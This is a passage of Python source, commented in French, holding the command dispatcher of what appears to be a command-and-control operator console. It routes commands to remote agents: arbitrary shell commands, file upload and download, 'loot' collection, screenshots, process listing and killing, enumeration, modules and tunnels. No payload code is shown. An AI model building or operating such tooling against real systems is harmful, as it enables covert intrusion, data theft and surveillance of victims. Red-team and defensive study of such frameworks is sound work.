        parts = []
        for dq, sq, plain in raw:
            if dq:
                parts.append(dq)
            elif sq:
                parts.append(sq.strip("'"))
            elif plain:
                parts.append(plain)
        
        if not parts:
            return True

        cmd  = parts[0].lower()
        args = parts[1:]

        # ── Sans auth ─────────────────────────────────────────
        if cmd == "login":
            if not args:
                print("Usage: login <operator_name>")
                return True
            self.cmd_login(args[0])
            return True

        if cmd in ("exit", "quit"):
            if self.token:
                self.cmd_logout()
            return False

        # ── Mots-clés réservés ────────────────────────────────
        RESERVED = {
            "logout", "list", "use", "back", "info",
            "send", "results", "result", "history",
            "events", "sessions", "stats", "help",
            "upload", "download", "loot", "sysinfo", "screenshot",
            "ps", "kill", "module", "tunnel", "enum"
        }

        # ── Mode focus : commande directe vers l'agent ────────
        # Toute commande non réservée → envoyée à focused_agent
        # Le résultat s'affiche directement dans ce terminal
        if self.focused_agent and cmd not in RESERVED:
            self.cmd_send(" ".join(parts))
            return True

        # ── Commandes normales ────────────────────────────────
        if cmd == "logout":
            self.cmd_logout()
        elif cmd == "list":
            self.cmd_list()
        elif cmd == "use":
            if not args:
                print("Usage: use <agent_id>")
            else:
                self.cmd_use(args[0])
        elif cmd == "back":
            self.cmd_back()
        elif cmd == "info":
            self.cmd_info(args[0] if args else None)
        elif cmd == "send":
            if not args:
                print("Usage: send <agent_id> <commande>  OU  send <commande> (mode focus)")
                return True
            first = args[0]
            # Détecte si c'est un agent_id (8 chars hex)
            if len(first) == 8 and all(c in "0123456789abcdef" for c in first.lower()):
                command = " ".join(args[1:])
                if command:
                    self.cmd_send(command, agent_id=first)
                else:
                    print("Usage: send <agent_id> <commande>")
            else:
                self.cmd_send(" ".join(args))
        elif cmd == "results":
            # Support "results" et "results all"
            all_sessions = len(args) > 0 and args[0].lower() == "all"
            self.cmd_results(all_sessions)
        elif cmd == "result":
            if not args:
                print("Usage: result <task_id>")
            else:
                self.cmd_result(args[0])
        elif cmd == "history":
            # Support "history" et "history all"
            all_sessions = len(args) > 0 and args[0].lower() == "all"
            self.cmd_history(all_sessions)
        elif cmd == "events":
            self.cmd_events(args[0] if args else None)
        elif cmd == "sessions":
            self.cmd_sessions()
        elif cmd == "stats":
            self.cmd_stats()
        elif cmd == "upload":
            if len(args) < 2:
                print("Usage: upload <local_file> <remote_path>")
            else:
                self.cmd_upload(args[0], args[1])
        elif cmd == "download":
            if len(args) < 1:
                print("Usage: download <remote_path> [local_path]")
            else:
                # Support: download <remote_path> <local_path>
                if len(args) == 1:
                    self.cmd_download(args[0])
                elif len(args) == 2:
                    self.cmd_download(args[0], args[1])
                else:
                    print("Usage: download <remote_path> [local_path]")
        elif cmd == "loot":
            agent_id = args[0] if args else (self.focused_agent or "all")
            self.cmd_loot(agent_id)
        elif cmd == "sysinfo":
            target = args[0] if args else self.focused_agent
            if not target:
                print("Usage: sysinfo <agent_id>  OU  use <id> puis sysinfo")
            else:
                self._send_module(target, "sysinfo", "sysinfo", "sysinfo")
        elif cmd == "screenshot":
            target = args[0] if args else self.focused_agent
            if not target:
                print("Usage: screenshot [agent_id]  OU  use <id> puis screenshot")
            else:
                self.cmd_screenshot(target)
        elif cmd == "ps":
            target = args[0] if args else self.focused_agent
            if not target:
                print("Usage: ps [agent_id]  OU  use <id> puis ps")
            else:
                self.cmd_process_list(target)
        elif cmd == "kill":
            target = args[0] if args else self.focused_agent
            if not target:
                print("Usage: kill [agent_id]  OU  use <id> puis kill")
            else:
                self.cmd_kill(target)
        elif cmd == "enum":
            self.cmd_enum(args)
        elif cmd == "module":
            self.cmd_module(args)
        elif cmd == "tunnel":
            self.cmd_tunnel(args)
        elif cmd == "help":
            self.cmd_help()
        else:
            print(f"[?] Commande inconnue: {cmd}  (tapez 'help')")

        return True